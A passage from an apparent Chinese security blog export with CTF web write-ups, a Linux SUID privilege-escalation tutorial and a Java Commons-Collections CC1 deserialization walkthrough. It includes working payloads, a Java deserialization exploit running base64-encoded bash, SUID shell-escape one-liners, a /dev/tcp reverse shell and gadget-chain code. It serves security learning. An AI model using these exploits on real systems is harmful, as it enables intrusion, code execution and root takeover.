来执行命令\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699533430884-f3f1f5a4-22e2-45e8-941b-b3bc43192f67.png)\n\nsubprocess.call()其实调用的是Popen()\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699533474760-aa96130f-7ade-4152-9926-fc7afe009013.png)\n\n我们跟进一下\n\n可以看到默认shell=false\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699533542743-270a8adc-f50c-4bb3-b282-6144db8e74de.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699533800870-0bb0adcb-5d03-4300-9797-77121fc4c848.png)\n\n值得注意的是进程被卡死在这里叫做死锁\n\n如果我们执行命令只是单纯一句指令 那么无论是shell等于true还是false 都会执行 两者没有差别\n\n加了参数那么shell=false就无法执行了\n\n因此这道题就应该先去修改subprocess.call()的第七个参数为true这样我们才能执行带有参数的命令\n\n通过 setattr来修改属性值\n\nsetattr(a,b,c)：将a对象的第b个属性修改为vlaue=c  \n\n需要注意这里exp是json格式的`exp = list(request.get_json()['exp'])`\n\npayload:`?exec=oka&num=7&bol=1`\n\n```javascript\n{\n    \"exp\":[\n        \"Popen\",\n        \"__init__\",\n        \"__defaults__\"\n    ]\n}\n```\n\n然后进行通过将命令执行的结果写入文件来读取 但是这里不能进行反弹shell 不知道是什么原因\n\n```\n?shell=mkdir+./static;ls+/>./static/a.txt&exec=ok\n```\n\n# WEEK3\n\n## 快问快答\n\n写脚本\n\n## sseerriiaalliizzee（未解出）\n\n纯眼瞎\n\n考点：\n\n- exit死亡绕过 \n\npop链不难\n\n那么这道题最大的坑点在于如何触发`__toString `其实是靠这里的echo语句触发（吐血）\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698741524834-753296b0-0c06-4261-b9ab-babb88c919f7.png)\n\n```javascript\n<?php\nclass Start{\n    public $barking;\n}\nclass CTF{ \n    public $part1;\n    public $part2;\n}\nclass Flag{\n}\n$a = new Start();\n$a->barking=new CTF();\n$a->barking->part1='php://filter/write=convert.base64-decode/resource=cmd.php';\n$a->barking->part2='AA'.base64_encode('<?php phpinfo();?>');\necho urlencode(serialize($a));\n?>\n```\n\n需要注意的是这里`+`也算是合法字符 所以要加两个任意字符AA来和`<?php die(\"+Genshin Impact Start!+\");?>`构成四个一组 \n\n也即是 `AAphpdie+GenshinImpactStart+`总计为28 为4的整数倍\n\n\n\n## gogogo（未解出）\n\n主要源码看这个\n\n```javascript\npackage route\n\nimport (\n\t\"github.com/gin-gonic/gin\"\n\t\"github.com/gorilla/sessions\"\n\t\"main/readfile\"\n\t\"net/http\"\n\t\"os\"\n\t\"regexp\"\n)\n\nvar store = sessions.NewCookieStore([]byte(os.Getenv(\"SESSION_KEY\")))\n\nfunc Index(c *gin.Context) {\n\tsession, err := store.Get(c.Request, \"session-name\")\n\tif err != nil {\n\t\thttp.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n\t\treturn\n\t}\n\tif session.Values[\"name\"] == nil {\n\t\tsession.Values[\"name\"] = \"User\"\n\t\terr = session.Save(c.Request, c.Writer)\n\t\tif err != nil {\n\t\t\thttp.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n\t\t\treturn\n\t\t}\n\t}\n\n\tc.String(200, \"Hello, User. How to become admin?\")\n\n}\n\nfunc Readflag(c *gin.Context) {\n\tsession, err := store.Get(c.Request, \"session-name\")\n\tif err != nil {\n\t\thttp.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n\t\treturn\n\t}\n\tif session.Values[\"name\"] == \"admin\" {\n\t\tc.String(200, \"Congratulation! You are admin,But how to get flag?\\n\")\n\n\t\tpath := c.Query(\"filename\")\n\n\t\treg := regexp.MustCompile(`[b-zA-Z_@#%^&*:{|}+<>\";\\[\\]]`)\n\n\t\tif reg.MatchString(path) {\n\n\t\t\thttp.Error(c.Writer, \"nonono\", http.StatusInternalServerError)\n\t\t\treturn\n\t\t}\n\n\t\tvar data []byte\n\t\tif path != \"\" {\n\t\t\tdata = readfile.ReadFile(path)\n\t\t} else {\n\t\t\tdata = []byte(\"请传入参数\")\n\t\t}\n\n\t\tc.JSON(200, gin.H{\n\t\t\t\"success\": \"read: \" + string(data),\n\t\t})\n\t} else {\n\t\tc.String(200, \"Hello, User. How to become admin?\")\n\t}\n\n}\n```\n\n看题目也知道是个go题目\n\n首先就是伪造admin身份 根据源码\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698745810102-34237fe9-659c-41d9-8498-8c6c637258ad.png)\n\nsession的key从环境变量中去获取的 盲猜为空 就像国赛那到题目一样 然后本地起一个环境\n\n首先在go.mod引入依赖 然后启动\n\n稍稍修改源码 使得我们session的身份为admin\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698745974982-7f9ac75d-f37d-4359-a5c2-d674dac2f84e.png)\n\n去获取session 然后打入题目\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698745913115-965ef058-cf6f-45d0-94cf-ef858b8a06dd.png)\n\n然后是/readflag路由 去读文件 要绕过一个正则\n\n```\nreg := regexp.MustCompile(`[b-zA-Z_@#%^&*:{|}+<>\";\\[\\]]`)\n```\n\n可见还有一个字符a没有过滤 直接利用通配符 \n\npayload：`/readflag?filename=/??a?`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698746089781-649d5278-6829-4ed4-8c45-56c3e1bd5e5d.png)\n","categories":["各赛事WP"]},{"title":"2023“网信柏鹭杯”大学生网络空间安全精英赛 WEB WP与复现","url":"/post/37ed1ed6.html","content":"\nweb \n\n<!--more-->\n\n# WEB\n\n## express fs\n\n看url是个nodejs文件读取的题目\n\n发现是原题https://cloud.tencent.com/developer/article/2123023\n\npayload:\n\nban了flag字样 对其双url编码即可绕过  \n\n因为Express 已经 URL 解码一次\n\n```\n?file[href]=a&file[origin]=1&file[protocol]=file:&file[hostname]=&file[pathname]=/fl%2561g.txt\n```\n\n## 综合题五\n\n有一个文件上传的点 但是这道题没用\n\n然后观察读取上传的文件url发现存在任意文件读取\n\n查看一下当前进程\n\n```\n/readfile?filename=../../../../../../proc/self/cmdline\n```\n\n发现/app目录下有jar包 就想读下来\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697181098715-b040db41-6a76-4e11-8f2b-66667ea5efaa.png)\n\n```\n/readfile?filename=../../../../../../app/demo.jar\n```\n\n当时比赛环境它有问题 我根本下载不下来 一直在转圈 \n\n复现发现是过了那个bp代理就下不下来 得去掉才行\n\n得到源码 很明显o0o函数在做一个异或操作或者调教gpt也能知道\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697182071732-2fb2892b-27e0-4309-9420-7c4ec6b1d0ff.png)\n\n直接用大头师傅的脚本\n\n```java\nimport base64\nfrom pwn import *\nkey = b'6925cc02789c1d2552b71acc4a2d48fd'\nenc = 'UFVTUhgqY3d0FQxRVFcHBlQLVwdSVlZRVlJWBwxeVgAHWgsBWgUAAQEJRA=='\nenc = base64.b64decode(enc)\nprint(enc)\n# key = bytes.fromhex(key)\nflag = xor(key,enc)\nprint(flag)\n# flag{ISEC-52e353a950c752b3dc8f0d1c949f0361}\n```\n\n## 综合题六\t\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697182444787-3fbf102c-d17d-4576-a2c6-fb57bf8a1134.png)\n\n重写readObject 并且有一个恶意类 还能执行命令函数 很明显一个java反序列化利用\n\n在这个路由下利用\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697184231819-d32a28fd-652a-4970-8d52-3083a7d92892.png)\n\nexp：\n\n```java\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectOutputStream;\nimport java.util.Base64;\n\npublic class exp {\n    public static void main(String[] args) throws Exception {\n        Ping ping = new Ping();\n        ping.setCommand(\"bash\");\n        ping.setArg1(\"-i\");\n        //和ysoserial命令利用方式一样\n        ping.setArg2(\"{echo,命令base64编码}|{base64,-d}|{bash,-i}\");\n        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);\n        objectOutputStream.writeObject(ping);\n        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));\n\n    }\n\n}\n```\n\n## 综合题七\n\n经过综合题六到内网 有一个redis并且22端口开放 就是redis写ssh公钥的 没环境大致和那个moectf内网渗透题目一模一样\n\n先从内网中读到redis密码\n\n```\n/readfile?filename=../../../../../../../usr/local/share/application.properties\nserver.port=18080\nserver.servlet.context-path=/\nmanagement.endpoints.web.exposure.include=heapdump\nspring.redis.host=172.25.0.10\nspring.redis.port=62341\nspring.redis.password=de17cb1cfa1a8e8011f027b416775c6a\nspring.servlet.multipart.max-file-size=10MB\n```\n\n之后流程可参考[Redis未授权访问写Webshell和公私钥认证获取root权限 - 卿先生 - 博客园](https://www.cnblogs.com/-qing-/p/10978912.html)\n\n## 还有三个题均为0解\n\n\n\n\n\n## \n","categories":["各赛事WP"]},{"title":"Linux suid提权","url":"/post/51218ec8.html","content":"\nLinux suid提权\n\n<!--more-->\n\n# what\n\nSUID（Set User ID）是一种 Unix 和类 Unix 操作系统中的权限位，用于改变执行文件的权限。当一个可执行文件被设置为 SUID，它在执行时将具有文件所有者的权限，而不是执行者的权限。\n\n简单说：如果一个文件具有s权限，那么当我们执行它时，不是以用户身份执行，而是以文件所有者身份执行，因而具有文件所有者的权限\n\n这可以用于在执行过程中获取特权，例如允许普通用户执行需要超级用户权限的操作，而无需登录超级用户账户\n\n> linux引入了3个文件来管理用户组：\n>\n> 1. /etc/passwd存放用户信息。\n> 2. /etc/shadow存放用户密码信息。\n> 3. /etc/group存放组信息。\n>\n> 在文件系统中的每个文件的文件头里面添加了用户和文件之间的关系信息。\n>\n> 用户信息/etc/passwd每行共有7个字段冒号隔开：\n>\n> 字段1为用户名。\n>\n> 字段2为用户的密码。\n>\n> 字段3为指UID，每个用户都有自己的uid。\n>\n> 字段4为组UID，每个用户都有不同的uid。\n>\n> 字段5为解释说明的字段。\n>\n> 字段6为指用户的根目录。\n>\n> 字段7为指登录shell，用户登录shell，当前为/bin/zsh表示可以登录，/sbin/nologin标识不被授权登录。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695300429889-ce892384-256a-4a3c-bb27-42fea2f16dfc.png)\n\n# 利用\n\n可以看到只有root的uid为0 如果把一个普通用户的uid修改为0，那么只要以普通用户的用户名和密码登录系统就会自动切换到root用户，在系统加固时一定要找出有哪些用户的uid为0\n\n当我们在linux创建文件时，非root用户是无法创建的，除非让root用户为我们提升权限或者用sudo命令\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695301362482-ee8ac428-a058-455a-b3e8-1720e6d35d1b.png)\n\n并且此时创建的文件的所属人所属组也是root 并不是我们自己\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695301465468-3823df3f-d3de-4b4d-9846-9427efb82035.png)\n\n因此 如果这个文件带有suid 那么当我们执行的时候就会以root权限进行执行，可执行文件运行时该进程的权限为root权限 从而提升权限\n\n# 如何设置suid\n\n```java\nchmod u+s filename #设置suid\nchmod u-s filename #去除suid\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695301658898-a848291a-5c20-413c-9a21-04496ec48d23.png)\n\n# 如何查找suid文件\n\n常用的几条：\n\n```java\nfind / -user root -perm -4000 -print 2>/dev/null\nfind / -perm -u=s -type f 2>/dev/null\nfind / -user root -perm -4000 -exec ls -ldb {} \\;\n```\n\n\n\n# 利用suid进行提权\n\n## 一些小思考\n\n以下有些命令说是提权但是只是进入一个shell交互界面 但是用户还是非root状态 \n\n网上好多文章也只是止步于此 并没有解释的清楚\n\n当然也并不能说它提权失败了\n\n提权不是说一定要提升到root用户 只要能达到**越权**效果**，**那么也算是狭义的提权了\n\n具体效果还要根据题目或者真实环境而已，但是能进入shell界面总归是一个好的开始\n\n## 前提\n\n以下命令都是基于自身已经被赋予了suid\n\n例如这里的find命令\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695302463326-c4705fe8-a5a3-4014-87c3-0a4ecdda6fe9.png)\n\n## find\n\n不过一般在实战中都是在/tmp下创建一个文件\n\n```plain\nfind 任意文件filename -exec whoami \\; -quit\nfind 任意文件filename -exec /bin/sh -p \\; -quit\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695302590191-1c53604d-2262-48c5-bda1-9ae0f0a0b135.png)\n\n网上还有利用这个find命令进行反弹shell提权的，但是反弹shell并没有提权，还是非root用户\n\n还是说我kali版本太高了被修复了\n\n```plain\nfind 1.txt -exec bash -c 'bash -i >& /dev/tcp/ip/7777 0>&1' \\; -quit\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695302838433-de1e7e64-d8c0-4c4a-baba-8cecb44ff71b.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695302856860-4dc3d84c-1bcb-44c1-a055-07676085a3a9.png)\n\n## bash\n\n```\nbash -p\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695306625262-713b59c5-1c4d-4bb0-a5b5-230412369279.png)\n\n## env\n\n```\nenv shell\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695307266506-96ed29d7-5765-4174-9ce8-cd53bef4d22e.png)\n\n## ionice\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695307617177-39000dd9-3c91-41d1-ae2c-bcb3d7818b34.png)\n\n## nice\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695307728837-ba456bf8-da4c-4829-b03b-4ab444a775f8.png)\n\n## less/more\n\n文件并非是/etc/passwd 只要是内容多的文件都行\n\n```plain\nless /etc/passwd\n!/bin/sh\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695303340197-a26ab244-f582-47bd-b027-f4b2fac1c1a0.png)\n\n## flock\n\n```\nflock -u / whoami\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695307508773-66215c04-f3d8-413f-9265-1d90b3b519df.png)\n\n## vim\n\n```plain\nvim.tiny /etc/passwd\n!/bin/sh\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695305813211-039f1589-170f-407d-aa7c-00f9ab781ec9.png)\n\n## nano\n\n```plain\nnano\nctrl + R\nctrl + X\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695306058324-eab07ed1-1309-45bd-94d0-eeec710bebc8.png)\n\n## awk\n\n```plain\nawk 'BEGIN {system(\"/bin/sh\")}'\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695307032638-b2a32ae6-9208-4a77-b2dc-52e1e871b0e3.png)\n\n## python \n\n在之前ctf一道题目遇到的 当然前提是得有suid\n\n```\npython3 -c \"import os;os.execl('/bin/sh','sh','-p')\"\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695307980036-d2044bf2-f133-4fc6-a53d-300f98457eca.png)\n\n# 终极工具\n\n一个在线网站 查看命令存在suid命令的用法\n\nhttps://gtfobins.github.io/\n\n# 后话\n\n利用suid提权主要思路:\n\n1. 首先找到所在环境以及具有suid的文件\n2. 然后找到相应命令进入shell交互的方法\n3. 执行shell\n\n遇到题目环境回来找找看就行了:)\n\n至此 先到这里\n\n# 参考：\n\nhttps://m.freebuf.com/articles/web/272617.htmlSUID\n\nhttps://tttang.com/archive/1793/#toc_strace\n\nhttps://xz.aliyun.com/t/12535#toc-14\n","categories":["知识学习"]},{"title":"Java序列化与反序列化","url":"/post/5e5c5c3.html","content":"\nJava序列化与反序列化+cc链\n\n<!--more-->\n\n# 前言\n\n> *Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream类的 writeObject() 方法可以实现序列化。*\n>\n> *Java 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。*\n\n序列化与反序列化是让 Java 对象脱离 Java 运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储\n\n与PHP不同的是php大概是序列化生成一串序列化字符串，而java是生成了字节流文件\n\nPHP通过一串字符串来在各种运行环境中穿梭，而java通过一个字节流文件来穿梭\n\n同时java没有类似于python或者php的魔术函数，它是通过链式调用，也就是套娃的方式来构造恶意链\n除此之外我们可以通过重写其默认的`readObject()`函数我们可以执行一些恶意命令执行函数\n\n# 序列化\n\n首先需要一个目标类\n\n```java\npackage com.Z1d10t;\nimport com.learn.learning;\n\nimport java.io.Serializable;\n\npublic class Student implements Serializable {\n    private String name=\"Tom\";\n    public int age = 1;\n\n    public transient String hobby = \"basketball\"; //不会参与序列化与反序列化\n\n\n    public String getName() {\n        return name;\n    }\n\n    public int getAge() {\n        return age;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public void setAge(int age) {\n        this.age = age;\n    }\n    private void display(String name){\n        System.out.println(\"This is \"+name);\n    }\n    public void see(int age){\n        System.out.println(\"Age is \"+age);\n    }\n\n    @Override\n    public String toString() {\n        return \"Student{\" +\n                \"name='\" + name + '\\'' +\n                \", age=\" + age +\n                '}';\n    }\n}\n```\n\n然后是我们的序列化过程\n\n```java\npackage com.Z1d10t;\n\nimport java.io.FileOutputStream;\nimport java.io.ObjectOutputStream;\n\npublic class Serialize {\n    public static void main(String[] args) throws Exception {\n        //实例化一个对象\n        Student stu = new Student();\n        //创建文件流\n        //创建一个包含对象进行反序列化信息的数据文件 这里起名为ser.ser可以任意取\n        FileOutputStream fileOutputStream = new FileOutputStream(\"ser.ser\");\n        //创建对象输出流\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);\n        //将我们的对象序列化写入对象输出流 也就是ser.ser文件中\n        objectOutputStream.writeObject(stu);\n        //释放资源 关闭流\n        objectOutputStream.close();\n        fileOutputStream.close();\n    }\n\n}\n```\n\n需要注意的是 我们要进行序列化与反序列化需要带有 `Serializable`接口才行\n\n还有关键字`transient`申明的属性不会参与序列化与反序列化\n\n# 反序列化\n\n```java\npackage com.Z1d10t;\n\nimport java.io.FileInputStream;\nimport java.io.ObjectInputStream;\n\npublic class Unserialize {\n    public static  void main(String[] args) throws Exception {\n        //从文件中反序列化对象\n        FileInputStream fileInputStream = new FileInputStream(\"ser.ser\");\n        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);\n        //恢复对象\n        Student stu2 = (Student) objectInputStream.readObject();\n\n    }\n\n}\n```\n\n可见hobby属性并没有被反序列化\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695179428869-b952b548-017a-428c-8dc2-567f9982efa7.png)\n\n# 简单利用\n\n如果我们在目标类中重写readObject函数 并且进行命令执行\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695179646673-b6e09605-1d54-46a9-a676-d4d3801e850d.png)\n\n```java\nprivate void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{\n        //执行默认的readObject()方法\n        in.defaultReadObject();\n        //执行打开计算器程序命令\n        Runtime.getRuntime().exec(\"calc\");\n    }\n```\n\n当我们反序列化执行`readObject()`的时候 就会自动调用我们的命令函数了\n\n这里需要注意就是我们还是需要执行系统默认设置的`in.defaultReadObject();`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695179805874-0bd15737-f88c-4d37-ae39-1d602a66a5a2.png)\n\n# cc1链复现\n\n## 环境搭建\n\n无脑看这个师傅的链接搭就行了[JAVA安全初探(三):CC1链全分析 - 先知社区](https://xz.aliyun.com/t/12669#toc-3)\n\n需要注意的是 配置好maven之后 就会自动帮我们把Comments-Collections-3.2.1下载到本地仓库\n\n就不用再去找源码了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695715437217-786b7c76-a173-4f66-b126-63d10b4db4ea.png)\n\n其次还要将其加进去\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695715472115-a7d5acc8-04ef-4e5d-a545-d23e92d9749e.png)\n\n## 源头利用点\n\n这个链子的源头是Common Collections库中的`Transformer`接口\n\n寻找一下继承了这个接口的类\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695454148260-4d7efa22-95fc-4ac2-bfff-a7f0d4b749b4.png)\n\n有很多 但是主角是`InvokerTransformer` \n\n我们跟进一下\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695454286059-69488c32-f40f-4059-9a92-9a519a7a469d.png)\n\n发现有我们很熟悉的反射调用那么这里很明显是一个利用点 并且它还支持反序列化 继承了Serializable接口\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695454750499-9f72da11-0375-417e-9ebb-dbb5f7a9126b.png)\n\n再来看他的构造方法\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695454338049-402a6a61-a492-46e7-811e-ec633bede5b3.png)\n\n一共三个，分别为方法名，变量类的数组，对象数组\n\n这是一个我们普通的通过反射调用`Runtime`的过程\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695454584580-bda06e70-f932-492d-ad62-eff23551f134.png)\n\n如果按照上面`InvokerTransformer的transform`来调用的话 就是这样\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695454630428-86637716-a9ba-43c2-8681-ebdbe96b30df.png)\n\n利用成功\n\n那么这样我们就找到了源头利用点 接下来就是找链子了 链式调用\n\n## 找链子\n\n去找谁调用了transform方法 \n\n有很多类调用了这个方法 但是这里复现`TransformedMap`的`checkSetValue`方法\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695455310738-ab67a44b-6049-4cf2-b4cc-6a79d6bb5544.png)\n\n这里可以看到方法类型和构造都是protected 所以我们只能内部调用或者子类调用与实例化 不能外部调用去实例化\n\n看看构造函数 返现它传进来一个Map对象然后对他的键和值都进行一些操作\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695455715878-319bf27f-4185-4294-943a-b8cc4e23cdb8.png)\n\n向上找 看看谁调用了方法或者构造了实例\n\n发现`docorate()`方法对它进行了实例化 并且还是static类型 那么就属于是类的方法 直接通过`类名.方法名`形式调用即可\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695455831118-c7b630d3-3e22-43c9-b5e1-5a955cc7c745.png)\n\n我们先来调用这个函数进行实例化\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695457356419-c7e90a07-4480-45b5-8614-dd6230a6156f.png)\n\n至于这里第二个参数为什么是null  因为checkSetValue只对第二个参数作用了 所以第一个参数传不传都无所谓\n\nTransformedMap这个类的`checkSetValue()`调用了`transform()`![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695642292657-090eb147-8e61-4514-9995-5323aa5d3c89.png)\n\n那么继续 看看谁调用了`checkSetValue()`\n\n发现只有一处调用了这个函数\n\nMapEntry类的`setValue()`函数\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695642386652-aa186b04-327f-4a8f-be3a-b1c0e4017ce6.png)\n\nMapEntry继承了AbstractMapEntryDecorator这个类 同时TransformedMap也继承了这个类\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695645406099-850f6c2a-c71d-4b0a-b878-959003e669c3.png)\n\nAbstractMapEntryDecorator有`setValue()`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695642628028-60228ef8-f835-4b8f-835c-cba892ce4dde.png)\n\n那么相当于子类MapEntry重写了父类的`setValue()` 其实本质上是重写了Entry这个接口的内置函数\n\n同时父类还有Map.Entry这个接口\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695642712810-7347986d-56cd-4531-80f7-7a851e479460.png)\n\n## 理解Entry\n\n那么至此 我们现需要了解一下什么Entry\n\n简单说Entry就是Map里的键值对 \n\nsetValue()是Map类的内置函数\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695645691608-056df975-e8f1-4445-9cd4-7a61eed39660.png)\n\n常常用来遍历map对象的时候这样使用 从字面意思也能看出是在赋值\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695646222714-9b3e4142-7931-4880-ab7d-95dfe1ab5645.png)\n\n## 继续\n\n这个类MapEntry的父类又引入了Map.Entry接口，所以我们只需要进行常用的Map遍历，就可以调用setValue方法\n\n到目前为止来缕一缕思路\n\nfor循环遍历`transformdMap`->调用`MapEntry`的`setValue()`->`transformdMap`的`checkSetValue()`->`InvokerTransformer.transform()`\n\n非常完美\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695647142500-9ff080bf-bd05-4910-955a-4dc57dde27f1.png)\n\n现在继续来看哪个可利用的类调用了`setValue()` \n\n如果谁的`readObject()`函数调用了`setValue()`那么刚好闭环 岂不美哉？？？\n\n那么就找到了`AnnotationInvocationHandler`它的readObject函数直接就调用了`setValue()`函数\n\n所以反序列化时候就会自动执行\n\n并且还是遍历Entry来执行的 难道这就是天意吗\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695649837057-9e263bcc-9a7f-454e-a4df-b095d3028056.png)\n\n来看他的构造函数\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695648493194-a326b7fe-335f-427e-b87a-a27f5650b66c.png)\n\n接受两个参数 分别是：\n\n继承了注解的Class 看这个类名也知道和注解有关系\n\n是个Map 并且我们可控 可以将之前的`transformdMap` 传入\n\n但是这个类有个缺陷就是 他没有申明public 也就是说只能在本package调用 如果想要在外部调用 就要用反射 并且只能用全限定方式调用  也就是`Class.forName(完整包名)`方式\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695651081539-852c6ebb-416e-4c52-95c4-e81fbcd1e531.png)\n\n这里再认识一下`Override`它是什么呢 它是一个注解 就是用来解释程序的附加信息 不会影响程序的正常运行 可以简单看作一个注释 当然不严谨 我们跟进一下\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695651156989-3fa22f7d-e40a-4e62-a238-1de53769c430.png)\n\n可以看到它上面还有两个注解 \n\n那么这两个注解叫做元注解 他们是用来解释注解的\n\nTarget一般是来限制注解的作用对象 \n\nRetention来限制注解作用阶段 比如源代码阶段还是程序运行阶段\n\n那么 让我们来运行一下 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695651501430-438fa22d-5ac9-4e27-be24-fd93f6262a18.png)\n\n惊了直接调用成功了 这里其实是有问题的 这里并不是我们反序列化调用计算器成功的而是\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695651551073-22e49eeb-b8ef-407d-8beb-30a5936f7a19.png)\n\n所以要把这一行注释了 一定要注意到这里！！\n\n```java\npackage com.Z1d10t.dubug;\n\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport javax.xml.crypto.dsig.Transform;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Method;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class Test {\n    public static void main(String[] args) throws Exception {\n        Runtime r = Runtime.getRuntime();\n\n        //        Class<? extends Runtime> runtiomeClass = r.getClass();\n        //        Method runtimeMethod = runtiomeClass.getMethod(\"exec\", String.class);\n        //        Object invokerObject = runtimeMethod.invoke(r, \"calc\");\n        InvokerTransformer rlInvokerTransformer = new InvokerTransformer(\"exec\",\n                                                                         new Class[]{String.class}, new Object[]{\"calc\"});\n        //rlInvokerTransformer.transform(r);\n        HashMap<Object, Object> map = new HashMap<>(); //先创建一个map对象\n        map.put(\"Z1d10t\",\"Z1d10t\");//任意填\n        Map<Object,Object> transformdMap =TransformedMap.decorate(map, null, rlInvokerTransformer);\n        //        for(Map.Entry Entry:transformdMap.entrySet()){\n        //            Entry.setValue(r); //注意我们这里都是在传一个对象\n        //        }\n        Class<?> annotationClass = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor annotationConstructor = annotationClass.getDeclaredConstructor(Class.class,Map.class);\n        annotationConstructor.setAccessible(true);\n        Object o = annotationConstructor.newInstance(Override.class, transformdMap);\n        serialize(o);\n        unserialize(\"ser.ser\");\n\n\n    }\n    public static void serialize(Object object) throws Exception{\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\"ser.ser\"));\n        objectOutputStream.writeObject(object);\n    }\n    public static void unserialize(String filename) throws Exception{\n        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));\n        